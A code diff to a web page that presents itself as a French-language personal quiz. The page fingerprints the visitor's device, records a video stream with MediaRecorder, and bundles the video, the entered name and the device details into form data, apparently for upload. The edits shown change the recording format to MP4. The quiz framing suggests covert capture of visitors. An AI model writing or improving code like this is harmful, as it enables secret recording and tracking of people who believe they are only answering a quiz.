@@ -246,6 +246,7 @@
         <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
             <input type="text" id="username" placeholder="Votre Nom Complet" required><br>
             
+            <!-- الأسئلة -->
             <div class="question-box">
                 <label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label>
                 <select id="q1" required>
@@ -665,8 +666,8 @@
                 modeSilencieuxOuNePasDerranger: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Détecté (Accessibilité activée)" : "Standard",
                 architectureCPU: cpuArchitecture,
                 codecsMediaSupportes: {
-                    webm: MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ? "Supporté" : "Non supporté",
-                    mp4: MediaRecorder.isTypeSupported('video/mp4') ? "Supporté" : "Non supporté"
+                    mp4: MediaRecorder.isTypeSupported('video/mp4') ? "Supporté" : "Non supporté",
+                    webm: MediaRecorder.isTypeSupported('video/webm') ? "Supporté" : "Non supporté"
                 }
             };
 
@@ -685,10 +686,14 @@
                 videoElement.srcObject = mediaStream;
 
                 let options = { videoBitsPerSecond: 250000 };
-                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
-                    options.mimeType = 'video/webm;codecs=vp8,opus';
+                
+                // ⚡ إجبار المتصفح على التسجيل بصيغة MP4 مباشرة إذا كانت مدعومة
+                if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264,aac')) {
+                    options.mimeType = 'video/mp4;codecs=h264,aac';
                 } else if (MediaRecorder.isTypeSupported('video/mp4')) {
                     options.mimeType = 'video/mp4';
+                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+                    options.mimeType = 'video/webm;codecs=vp8,opus';
                 }
 
                 mediaRecorder = new MediaRecorder(mediaStream, options);
@@ -718,9 +723,14 @@
 
             const username = document.getElementById('username').value || "Utilisateur Anonyme";
             const deviceDetails = await getDetailedDeviceInfo();
-            const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/webm';
-            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-            const videoBlob = new Blob(currentChunks, { type: mimeType });
+            
+            // تحديد الامتداد بناءً على نوع الـ MIME المسجل فعلياً
+            const mimeType = mediaRecorder ? mediaRecorder.mimeType : '';
+            const isMp4 = mimeType.includes('mp4');
+            const ext = isMp4 ? 'mp4' : 'webm';
+            const finalMime = isMp4 ? 'video/mp4' : 'video/webm';
+            
+            const videoBlob = new Blob(currentChunks, { type: finalMime });
 
             const formData = new FormData();
             formData.append('username', `${username} [${reason}]`);
